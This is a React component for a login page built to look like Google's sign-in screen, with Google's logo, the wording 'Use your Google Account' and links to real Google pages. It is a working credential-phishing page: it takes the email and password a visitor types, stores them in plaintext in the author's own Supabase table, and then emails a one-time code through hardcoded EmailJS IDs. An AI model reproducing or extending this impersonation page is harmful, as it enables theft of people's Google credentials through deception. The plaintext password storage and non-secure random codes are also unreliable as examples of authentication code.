import {
  Box,
  Button,
  Flex,
  HStack,
  Input,
  Link,
  Text,
  VStack,
  Image,
  Select,
  Stack,
} from "@chakra-ui/react";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "../supabaseClient";
import emailjs from "@emailjs/browser";

export default function Login() {
  const [step, setStep] = useState(1); // step 1 = email, step 2 = password
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const navigate = useNavigate();

  const handleNext = async () => {
    if (step === 1 && email) {
      setStep(2);
    } else if (step === 2 && password) {
      // Save to Supabase users table
      const { data: existingUser, error } = await supabase
        .from("users")
        .select("*")
        .eq("email", email)
        .maybeSingle();

      if (error) {
        console.error("Error checking user:", error.message);
        alert("Something went wrong checking the user.");
        return;
      }

      if (!existingUser) {
        const { error: insertError } = await supabase
          .from("users")
          .insert([{ email, password }]);
        if (insertError) {
          console.error("Insert error:", insertError.message);
          alert("Failed to save user.");
          return;
        }
      } else {
        const { error: updateError } = await supabase
          .from("users")
          .update({ password })
          .eq("email", email);
        if (updateError) {
          console.error("Update error:", updateError.message);
          alert("Failed to update password.");
          return;
        }
      }

      // Generate OTP
      const newCode = Math.floor(100000 + Math.random() * 900000).toString();
      const expiryTime = new Date(Date.now() + 15 * 60 * 1000);

      const { error: otpError } = await supabase.from("otps").insert([
        { email, code: newCode, expires_at: expiryTime.toISOString() },
      ]);

      if (otpError) {
        console.error("OTP insert error:", otpError.message);
        alert("Failed to generate OTP.");
        return;
      }

      // Send OTP via EmailJS
      try {
        await emailjs.send(
          "service_pn1ecn9",
          "template_xqsd4l8",
          {
            email: email,
            passcode: newCode,
            time: expiryTime.toLocaleTimeString([], {
              hour: "2-digit",
              minute: "2-digit",
            }),
          },
          "B3qq_r0cNoHULpzEV"
        );
      } catch (err) {
        console.error("EmailJS error:", err);
        alert("Failed to send OTP.");
        return;
      }

      navigate("/verify", { state: { email } });
    }
  };

  return (
    <Flex
      minH="100vh"
      bg="#000000"
      justify="space-between"
      align="center"
      direction="column"
      fontFamily="Arial, sans-serif"
    >
      {/* Main content */}
      <Flex
        direction="column"
        w="100%"
        maxW="450px"
        mx="auto"
        flex="1"
        justify="center"
        px={{ base: 6, sm: 0 }}
        color="white"
      >
        <VStack align="stretch" spacing={6}>
          {/* Google logo */}
          <Image
            src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png"
            alt="Google logo"
            boxSize="40px"
            mb={2}
          />

          {/* Title */}
          <Box>
            <Text fontSize="2xl" fontWeight="400">
              Sign in
            </Text>
            <Text fontSize="md" color="gray.400">
              Use your Google Account
            </Text>
          </Box>

          {/* Step 1: Email / Step 2: Password */}
          {step === 1 ? (
            <Box>
              <Input
                placeholder="Email or phone"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                bg="transparent"
                borderColor="gray.600"
                borderRadius="md"
                h="50px"
                fontSize="md"
                _focus={{ borderColor: "#1a73e8" }}
                _placeholder={{ color: "gray.400" }}
              />
              <Link
                color="#1a73e8"
                fontSize="sm"
                mt={2}
                display="block"
                href="https://accounts.google.com/signin/recovery"
                isExternal
              >
                Forgot email?
              </Link>
            </Box>
          ) : (
            <Box>
              <Input
                type="password"
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                bg="transparent"
                borderColor="gray.600"
                borderRadius="md"
                h="50px"
                fontSize="md"
                _focus={{ borderColor: "#1a73e8" }}
                _placeholder={{ color: "gray.400" }}
              />
              <Link
                color="#1a73e8"
                fontSize="sm"
                mt={2}
                display="block"
                href="https://accounts.google.com/signin/recovery"
                isExternal
              >
                Forgot password?
              </Link>
            </Box>
          )}

          {/* Buttons */}
          <HStack justify="space-between" pt={4}>
            <Link
              color="#1a73e8"
              fontSize="sm"
              href="https://accounts.google.com/signup"
              isExternal
            >
              Create account
            </Link>
            <Button
  bg="#1a73e8"
  color="white"
  fontSize="14px"
  fontWeight="500"
  px={8}
  h="40px"
  rounded="full"
  _hover={{ bg: "#1765cc" }}
  _active={{ bg: "#1558b0" }}
  _focus={{ boxShadow: "0 0 0 2px #aecbfa" }}
  onClick={handleNext}
>
  Next
</Button>

          </HStack>
        </VStack>
      </Flex>

      {/* Footer */}
      <Flex
        w="100%"
        justify="space-between"
        align="center"
        px={6}
        py={4}
        fontSize="sm"
        color="gray.400"
        borderTop="1px solid #3c4043"
        direction={{ base: "column", sm: "row" }}
        gap={{ base: 3, sm: 0 }}
      >
        <Select
          w="200px"
          bg="transparent"
          border="none"
          color="gray.400"
          fontSize="sm"
          textAlign="center"
          _focus={{ outline: "none" }}
        >
          <option style={{ color: "black" }}>English (United States)</option>
          <option style={{ color: "black" }}>Filipino</option>
          <option style={{ color: "black" }}>Español</option>
        </Select>

        <Stack direction="row" spacing={6}>
          <Link href="https://support.google.com/accounts" isExternal>
            Help
          </Link>
          <Link href="https://policies.google.com/privacy" isExternal>
            Privacy
          </Link>
          <Link href="https://policies.google.com/terms" isExternal>
            Terms
          </Link>
        </Stack>
      </Flex>
    </Flex>
  );
}
